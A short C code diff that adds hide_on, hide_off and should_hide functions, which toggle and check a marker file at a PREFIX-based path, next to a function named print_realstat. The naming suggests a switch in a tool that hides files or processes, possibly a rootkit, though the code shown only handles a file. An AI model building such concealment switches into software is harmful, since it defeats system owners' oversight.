@@ -217,3 +217,18 @@ void print_realstat(void)
     }
     close(f);
 }
+
+void hide_on(void)
+{
+    close(open("/" PREFIX ".hide", O_CREAT | O_WRONLY));
+}
+
+void hide_off(void)
+{
+    remove("/" PREFIX ".hide");
+}
+
+bool should_hide(void)
+{
+    return access("/" PREFIX ".hide", F_OK) == 0;
+}
